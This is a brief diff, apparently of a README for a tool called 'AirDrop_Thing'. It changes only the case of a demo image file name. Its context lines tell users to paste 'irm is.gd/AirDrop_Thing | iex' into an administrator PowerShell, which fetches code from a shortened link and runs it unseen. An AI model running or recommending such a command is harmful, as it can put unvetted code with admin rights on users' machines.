@@ -6,4 +6,4 @@ Open PowerShell as admin and paste this:
 irm is.gd/AirDrop_Thing | iex
 
 
-<img src="demo.gif" width="100%">
+<img src="Demo.gif" width="100%">
